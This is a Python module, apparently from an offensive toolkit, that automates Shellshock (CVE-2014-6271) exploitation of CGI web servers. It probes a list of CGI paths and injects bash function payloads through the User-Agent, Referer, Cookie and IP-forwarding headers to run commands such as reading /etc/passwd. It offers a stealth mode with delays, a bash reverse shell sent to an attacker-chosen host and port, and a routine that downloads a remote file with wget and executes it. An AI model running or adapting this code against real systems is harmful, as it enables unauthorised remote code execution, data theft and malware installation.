"""
Shellshock Exploitation Module
Implements CVE-2014-6271 (Shellshock) exploitation for web applications and CGI scripts
"""

import asyncio
import aiohttp
import re
import time
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any, Tuple
from urllib.parse import urljoin, urlparse
from datetime import datetime

from loguru import logger
from src.core.config import ConfigManager
from .multi_protocol_engine import ExploitTarget, ExploitResult, ExploitationConfig, ExploitationMode, ProtocolType


@dataclass
class ShellshockPayload:
    """Shellshock payload configuration"""
    command: str
    user_agent: bool = True
    referer: bool = True
    cookie: bool = True
    custom_headers: Dict[str, str] = field(default_factory=dict)


@dataclass
class WebTarget:
    """Web application target for Shellshock exploitation"""
    url: str
    cgi_paths: List[str] = field(default_factory=list)
    parameters: Dict[str, str] = field(default_factory=dict)
    headers: Dict[str, str] = field(default_factory=dict)


class ShellshockExploiter:
    """Shellshock (CVE-2014-6271) exploitation module"""

    def __init__(self, config_manager: Optional[ConfigManager] = None):
        """Initialize Shellshock exploiter"""
        self.config_manager = config_manager or ConfigManager()
        self.session = None
        
        # Common CGI paths to test
        self.common_cgi_paths = [
            '/cgi-bin/test.cgi',
            '/cgi-bin/test.sh',
            '/cgi-bin/env.cgi',
            '/cgi-bin/printenv',
            '/cgi-bin/status',
            '/cgi-bin/admin.cgi',
            '/cgi-bin/test-cgi',
            '/cgi-bin/hello.cgi',
            '/cgi-bin/info.cgi',
            '/cgi-bin/date.cgi',
            '/scripts/test.cgi',
            '/scripts/printenv',
            '/test.cgi',
            '/env.cgi',
            '/cgi/test.cgi',
            '/cgi/env.cgi'
        ]
        
        # Shellshock test payloads
        self.test_payloads = [
            "() { :; }; echo; echo; /bin/cat /etc/passwd",
            "() { :; }; echo; echo; /usr/bin/id",
            "() { :; }; echo; echo; /bin/uname -a",
            "() { :; }; echo; echo; /bin/pwd",
            "() { :; }; echo; echo; /bin/whoami"
        ]

    async def exploit_targets(self, targets: List[ExploitTarget],
                            config: ExploitationConfig) -> List[ExploitResult]:
        """
        Exploit multiple web targets for Shellshock vulnerability
        
        Args:
            targets: List of web targets
            config: Exploitation configuration
            
        Returns:
            List of exploitation results
        """
        results = []
        
        # Create HTTP session
        timeout = aiohttp.ClientTimeout(total=config.timeout)
        connector = aiohttp.TCPConnector(limit=config.max_concurrent)
        
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            self.session = session
            
            semaphore = asyncio.Semaphore(config.max_concurrent)
            tasks = []
            
            for target in targets:
                task = asyncio.create_task(
                    self._exploit_single_target_with_semaphore(target, config, semaphore)
                )
                tasks.append(task)
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Filter out exceptions
            valid_results = []
            for i, result in enumerate(results):
                if isinstance(result, Exception):
                    logger.error(f"Shellshock exploitation failed for {targets[i].host}: {result}")
                    valid_results.append(ExploitResult(
                        target=targets[i],
                        success=False,
                        exploit_type="shellshock",
                        error_message=str(result)
                    ))
                else:
                    valid_results.append(result)
        
        return valid_results

    async def _exploit_single_target_with_semaphore(self, target: ExploitTarget,
                                                  config: ExploitationConfig,
                                                  semaphore: asyncio.Semaphore) -> ExploitResult:
        """Exploit single target with concurrency control"""
        async with semaphore:
            return await self.exploit_single_target(target, config)

    async def exploit_single_target(self, target: ExploitTarget,
                                  config: ExploitationConfig) -> ExploitResult:
        """
        Exploit a single web target for Shellshock vulnerability
        
        Args:
            target: Web target to exploit
            config: Exploitation configuration
            
        Returns:
            Exploitation result
        """
        start_time = time.time()
        
        # Construct base URL
        scheme = "https" if target.protocol.value == "https" else "http"
        base_url = f"{scheme}://{target.host}:{target.port}"
        
        logger.info(f"Starting Shellshock exploitation of {base_url}")
        
        # Test for Shellshock vulnerability
        vulnerable_paths = await self._discover_vulnerable_cgi(base_url, config)
        
        if not vulnerable_paths:
            return ExploitResult(
                target=target,
                success=False,
                exploit_type="shellshock",
                error_message="No vulnerable CGI scripts found",
                execution_time=time.time() - start_time
            )
        
        # Exploit the first vulnerable path found
        vulnerable_path = vulnerable_paths[0]
        exploit_result = await self._exploit_shellshock(base_url, vulnerable_path, config)
        
        exploit_result.execution_time = time.time() - start_time
        return exploit_result

    async def _discover_vulnerable_cgi(self, base_url: str,
                                     config: ExploitationConfig) -> List[str]:
        """Discover CGI scripts vulnerable to Shellshock"""
        vulnerable_paths = []
        
        logger.info(f"Discovering vulnerable CGI scripts on {base_url}")
        
        for cgi_path in self.common_cgi_paths:
            try:
                url = urljoin(base_url, cgi_path)
                
                # Test with a simple Shellshock payload
                test_payload = "() { :; }; echo; echo; /bin/echo 'SHELLSHOCK_TEST_12345'"
                
                headers = {
                    'User-Agent': test_payload,
                    'Referer': test_payload,
                    'Cookie': f'test={test_payload}'
                }
                
                async with self.session.get(url, headers=headers) as response:
                    content = await response.text()
                    
                    # Check if our test string appears in response
                    if 'SHELLSHOCK_TEST_12345' in content:
                        logger.success(f"Shellshock vulnerability found: {url}")
                        vulnerable_paths.append(cgi_path)
                        
                        # In stealth mode, only find one vulnerable path
                        if config.mode == ExploitationMode.STEALTH:
                            break
                
                # Add delay for stealth
                if config.mode == ExploitationMode.STEALTH:
                    await asyncio.sleep(config.stealth_delay)
                    
            except Exception as e:
                logger.debug(f"Error testing {cgi_path}: {e}")
                continue
        
        logger.info(f"Found {len(vulnerable_paths)} vulnerable CGI scripts")
        return vulnerable_paths

    async def _exploit_shellshock(self, base_url: str, cgi_path: str,
                                config: ExploitationConfig) -> ExploitResult:
        """Exploit Shellshock vulnerability on specific CGI script"""
        url = urljoin(base_url, cgi_path)
        target_info = urlparse(base_url)
        
        protocol_type = ProtocolType.HTTPS if target_info.scheme == 'https' else ProtocolType.HTTP

        target = ExploitTarget(
            host=target_info.hostname,
            port=target_info.port or (443 if target_info.scheme == 'https' else 80),
            protocol=protocol_type,
            service_name="http"
        )
        
        logger.info(f"Exploiting Shellshock vulnerability: {url}")
        
        # Try different exploitation techniques
        techniques = [
            self._exploit_via_user_agent,
            self._exploit_via_referer,
            self._exploit_via_cookie,
            self._exploit_via_custom_headers
        ]
        
        for technique in techniques:
            try:
                result = await technique(url, target, config)
                if result.success:
                    return result
                    
            except Exception as e:
                logger.debug(f"Shellshock technique failed: {e}")
                continue
        
        return ExploitResult(
            target=target,
            success=False,
            exploit_type="shellshock",
            error_message="All Shellshock exploitation techniques failed"
        )

    async def _exploit_via_user_agent(self, url: str, target: ExploitTarget,
                                    config: ExploitationConfig) -> ExploitResult:
        """Exploit Shellshock via User-Agent header"""
        # Command to execute (start with info gathering)
        command = "/bin/uname -a; /usr/bin/id; /bin/pwd"
        payload = f"() {{ :; }}; echo; echo; {command}"
        
        headers = {'User-Agent': payload}
        
        try:
            async with self.session.get(url, headers=headers) as response:
                content = await response.text()
                
                # Check if command executed successfully
                if self._is_command_executed(content):
                    logger.success(f"Shellshock exploitation successful via User-Agent: {url}")
                    
                    return ExploitResult(
                        target=target,
                        success=True,
                        exploit_type="shellshock_user_agent",
                        payload_delivered=True,
                        additional_data={
                            'url': url,
                            'method': 'user_agent',
                            'command_output': content,
                            'payload': payload
                        }
                    )
                    
        except Exception as e:
            logger.debug(f"User-Agent Shellshock failed: {e}")
        
        return ExploitResult(
            target=target,
            success=False,
            exploit_type="shellshock_user_agent",
            error_message="User-Agent exploitation failed"
        )

    async def _exploit_via_referer(self, url: str, target: ExploitTarget,
                                 config: ExploitationConfig) -> ExploitResult:
        """Exploit Shellshock via Referer header"""
        command = "/bin/uname -a; /usr/bin/id; /bin/pwd"
        payload = f"() {{ :; }}; echo; echo; {command}"
        
        headers = {'Referer': payload}
        
        try:
            async with self.session.get(url, headers=headers) as response:
                content = await response.text()
                
                if self._is_command_executed(content):
                    logger.success(f"Shellshock exploitation successful via Referer: {url}")
                    
                    return ExploitResult(
                        target=target,
                        success=True,
                        exploit_type="shellshock_referer",
                        payload_delivered=True,
                        additional_data={
                            'url': url,
                            'method': 'referer',
                            'command_output': content,
                            'payload': payload
                        }
                    )
                    
        except Exception as e:
            logger.debug(f"Referer Shellshock failed: {e}")
        
        return ExploitResult(
            target=target,
            success=False,
            exploit_type="shellshock_referer",
            error_message="Referer exploitation failed"
        )

    async def _exploit_via_cookie(self, url: str, target: ExploitTarget,
                                config: ExploitationConfig) -> ExploitResult:
        """Exploit Shellshock via Cookie header"""
        command = "/bin/uname -a; /usr/bin/id; /bin/pwd"
        payload = f"() {{ :; }}; echo; echo; {command}"
        
        headers = {'Cookie': f'test={payload}'}
        
        try:
            async with self.session.get(url, headers=headers) as response:
                content = await response.text()
                
                if self._is_command_executed(content):
                    logger.success(f"Shellshock exploitation successful via Cookie: {url}")
                    
                    return ExploitResult(
                        target=target,
                        success=True,
                        exploit_type="shellshock_cookie",
                        payload_delivered=True,
                        additional_data={
                            'url': url,
                            'method': 'cookie',
                            'command_output': content,
                            'payload': payload
                        }
                    )
                    
        except Exception as e:
            logger.debug(f"Cookie Shellshock failed: {e}")
        
        return ExploitResult(
            target=target,
            success=False,
            exploit_type="shellshock_cookie",
            error_message="Cookie exploitation failed"
        )

    async def _exploit_via_custom_headers(self, url: str, target: ExploitTarget,
                                        config: ExploitationConfig) -> ExploitResult:
        """Exploit Shellshock via custom HTTP headers"""
        command = "/bin/uname -a; /usr/bin/id; /bin/pwd"
        payload = f"() {{ :; }}; echo; echo; {command}"
        
        # Try various HTTP headers that might be processed by CGI
        test_headers = [
            'X-Forwarded-For',
            'X-Real-IP',
            'X-Originating-IP',
            'CF-Connecting-IP',
            'X-Remote-IP',
            'X-Remote-Addr',
            'X-Client-IP'
        ]
        
        for header_name in test_headers:
            try:
                headers = {header_name: payload}
                
                async with self.session.get(url, headers=headers) as response:
                    content = await response.text()
                    
                    if self._is_command_executed(content):
                        logger.success(f"Shellshock exploitation successful via {header_name}: {url}")
                        
                        return ExploitResult(
                            target=target,
                            success=True,
                            exploit_type=f"shellshock_{header_name.lower().replace('-', '_')}",
                            payload_delivered=True,
                            additional_data={
                                'url': url,
                                'method': header_name,
                                'command_output': content,
                                'payload': payload
                            }
                        )
                        
            except Exception as e:
                logger.debug(f"{header_name} Shellshock failed: {e}")
                continue
        
        return ExploitResult(
            target=target,
            success=False,
            exploit_type="shellshock_custom_headers",
            error_message="Custom headers exploitation failed"
        )

    def _is_command_executed(self, content: str) -> bool:
        """Check if command was executed successfully"""
        # Look for common command output patterns
        indicators = [
            r'Linux.*\d+\.\d+\.\d+',  # uname -a output
            r'uid=\d+.*gid=\d+',      # id command output
            r'root:x:0:0:',           # /etc/passwd content
            r'/bin/bash',             # shell paths
            r'/home/',                # home directories
            r'GNU/Linux'              # OS information
        ]
        
        for pattern in indicators:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        
        return False

    async def execute_custom_command(self, url: str, command: str,
                                   method: str = "user_agent") -> Optional[str]:
        """Execute custom command via Shellshock"""
        payload = f"() {{ :; }}; echo; echo; {command}"
        
        headers = {}
        if method == "user_agent":
            headers['User-Agent'] = payload
        elif method == "referer":
            headers['Referer'] = payload
        elif method == "cookie":
            headers['Cookie'] = f'test={payload}'
        else:
            headers[method] = payload
        
        try:
            async with self.session.get(url, headers=headers) as response:
                content = await response.text()
                
                # Extract command output (after the double echo)
                lines = content.split('\n')
                output_started = False
                output_lines = []
                
                for line in lines:
                    if output_started:
                        output_lines.append(line)
                    elif line.strip() == '':
                        output_started = True
                
                return '\n'.join(output_lines).strip()
                
        except Exception as e:
            logger.error(f"Custom command execution failed: {e}")
            return None

    async def establish_reverse_shell(self, url: str, lhost: str, lport: int,
                                    method: str = "user_agent") -> bool:
        """Establish reverse shell via Shellshock"""
        # Bash reverse shell payload
        command = f"/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        payload = f"() {{ :; }}; echo; echo; {command}"
        
        headers = {}
        if method == "user_agent":
            headers['User-Agent'] = payload
        elif method == "referer":
            headers['Referer'] = payload
        elif method == "cookie":
            headers['Cookie'] = f'test={payload}'
        else:
            headers[method] = payload
        
        try:
            # Send the payload (don't wait for response as it will hang)
            async with self.session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as response:
                pass
            
            logger.success(f"Reverse shell payload sent to {url}")
            return True
            
        except asyncio.TimeoutError:
            # Timeout is expected for reverse shell
            logger.success(f"Reverse shell payload sent to {url} (timeout expected)")
            return True
        except Exception as e:
            logger.error(f"Failed to establish reverse shell: {e}")
            return False

    async def download_and_execute(self, url: str, download_url: str,
                                 method: str = "user_agent") -> bool:
        """Download and execute file via Shellshock"""
        # Create download and execute command
        filename = download_url.split('/')[-1] or 'payload'
        command = f"cd /tmp && wget {download_url} -O {filename} && chmod +x {filename} && ./{filename}"
        payload = f"() {{ :; }}; echo; echo; {command}"
        
        headers = {}
        if method == "user_agent":
            headers['User-Agent'] = payload
        elif method == "referer":
            headers['Referer'] = payload
        elif method == "cookie":
            headers['Cookie'] = f'test={payload}'
        else:
            headers[method] = payload
        
        try:
            async with self.session.get(url, headers=headers) as response:
                content = await response.text()
                
                # Check if download was successful
                if 'saved' in content.lower() or 'downloaded' in content.lower():
                    logger.success(f"File downloaded and executed via Shellshock: {download_url}")
                    return True
                    
        except Exception as e:
            logger.error(f"Download and execute failed: {e}")
        
        return False

    def create_web_target_from_scan(self, host: str, port: int, 
                                  service_name: str) -> Optional[ExploitTarget]:
        """Create web target from scan results"""
        if service_name.lower() not in ['http', 'https', 'www', 'web']:
            return None
        
        protocol = "https" if port in [443, 8443] or 'ssl' in service_name.lower() else "http"
        
        return ExploitTarget(
            host=host,
            port=port,
            protocol=protocol,
            service_name=service_name
        )

    def get_exploitation_report(self, results: List[ExploitResult]) -> Dict[str, Any]:
        """Generate detailed exploitation report"""
        successful_exploits = [r for r in results if r.success]
        
        report = {
            'total_targets': len(results),
            'successful_exploits': len(successful_exploits),
            'success_rate': (len(successful_exploits) / len(results)) * 100 if results else 0,
            'vulnerable_hosts': [],
            'exploitation_methods': {},
            'command_outputs': []
        }
        
        for result in successful_exploits:
            host_info = {
                'host': result.target.host,
                'port': result.target.port,
                'method': result.exploit_type,
                'timestamp': result.timestamp.isoformat()
            }
            
            if result.additional_data:
                host_info.update(result.additional_data)
            
            report['vulnerable_hosts'].append(host_info)
            
            # Count exploitation methods
            method = result.exploit_type
            report['exploitation_methods'][method] = report['exploitation_methods'].get(method, 0) + 1
            
            # Store command outputs
            if 'command_output' in result.additional_data:
                report['command_outputs'].append({
                    'host': result.target.host,
                    'output': result.additional_data['command_output']
                })
        
        return report
